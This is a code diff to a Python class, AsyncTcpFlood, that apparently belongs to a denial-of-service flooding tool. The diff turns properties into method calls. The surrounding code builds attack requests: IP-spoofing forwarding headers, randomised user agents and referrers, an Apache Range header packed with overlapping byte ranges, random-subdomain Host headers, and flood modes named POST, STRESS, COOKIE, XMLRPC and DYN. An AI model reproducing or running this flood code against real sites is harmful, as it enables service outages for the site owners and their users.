@@ -190,7 +190,6 @@ class AsyncTcpFlood:
     def is_tls(self):
         return self._target.scheme.lower() == "https" or self._target.port == 443
 
-    @property
     def spoof_ip(self) -> str:
         spoof: str = Tools.rand_ipv4()
         return (
@@ -202,22 +201,19 @@ class AsyncTcpFlood:
             f'Real-IP: {spoof}\r\n'
         )
 
-    @property
     def random_headers(self) -> str:
         return (
             f"User-Agent: {random.choice(USERAGENTS)}\r\n"
             f"Referrer: {random.choice(REFERERS)}{parse.quote(self._target.human_repr())}\r\n" +
-            self.spoof_ip
+            self.spoof_ip()
         )
 
-    @property
     def default_headers(self):
         return (
-            self.random_headers +
+            self.random_headers() +
             f"Host: {self._target.authority}\r\n"
         )
 
-    @property
     def default_path_qs(self):
         path_qs = self._target.raw_path_qs
         if self._target.raw_query_string:
@@ -227,8 +223,8 @@ class AsyncTcpFlood:
         return path_qs
 
     def build_request(self, path_qs=None, headers=None, body=None):
-        path_qs = path_qs or self.default_path_qs
-        headers = headers or self.default_headers
+        path_qs = path_qs or self.default_path_qs()
+        headers = headers or self.default_headers()
         request = (
             f"{self._req_type} {path_qs} HTTP/1.1\r\n"
             'Accept-Encoding: gzip, deflate, br\r\n'
@@ -332,7 +328,7 @@ class AsyncTcpFlood:
     async def POST(self, on_connect=None) -> bool:
         payload: bytes = self.build_request(
             headers=(
-                self.default_headers +
+                self.default_headers() +
                 "Content-Length: 44\r\n"
                 "X-Requested-With: XMLHttpRequest\r\n"
                 "Content-Type: application/json\r\n"
@@ -344,7 +340,7 @@ class AsyncTcpFlood:
     async def STRESS(self, on_connect=None) -> bool:
         payload: bytes = self.build_request(
             headers=(
-                self.default_headers +
+                self.default_headers() +
                 f"Content-Length: 524\r\n"
                 "X-Requested-With: XMLHttpRequest\r\n"
                 "Content-Type: application/json\r\n"
@@ -356,7 +352,7 @@ class AsyncTcpFlood:
     async def COOKIE(self, on_connect=None) -> bool:
         payload: bytes = self.build_request(
             headers=(
-                self.default_headers +
+                self.default_headers() +
                 f"Cookie: _ga=GA{random.randint(1000, 99999)};"
                 " _gat=1;"
                 " __cfduid=dc232334gwdsd23434542342342342475611928;"
@@ -368,7 +364,7 @@ class AsyncTcpFlood:
     async def APACHE(self, on_connect=None) -> bool:
         payload: bytes = self.build_request(
             headers=(
-                self.default_headers +
+                self.default_headers() +
                 "Range: bytes=0-,%s\r\n" % ",".join("5-%d" % i for i in range(1, 1024))
             )
         )
@@ -377,7 +373,7 @@ class AsyncTcpFlood:
     async def XMLRPC(self, on_connect=None) -> bool:
         payload: bytes = self.build_request(
             headers=(
-                self.default_headers +
+                self.default_headers() +
                 "Content-Length: 345\r\n"
                 "X-Requested-With: XMLHttpRequest\r\n"
                 "Content-Type: application/xml\r\n"
@@ -402,7 +398,7 @@ class AsyncTcpFlood:
     async def DYN(self, on_connect=None) -> bool:
         payload: bytes = self.build_request(
             headers=(
-                self.random_headers +
+                self.random_headers() +
                 "Host: %s.%s\r\n" % (Tools.rand_str(6), self._target.authority)
             )
         )
@@ -412,7 +408,7 @@ class AsyncTcpFlood:
         payload: bytes = self.build_request(
             path_qs=self._target.raw_path_qs,
             headers=(
-                self.spoof_ip +
+                self.spoof_ip() +
                 f"Host: {self._target.authority}\r\n"
                 "User-Agent: null\r\n"
                 "Referrer: null\r\n"
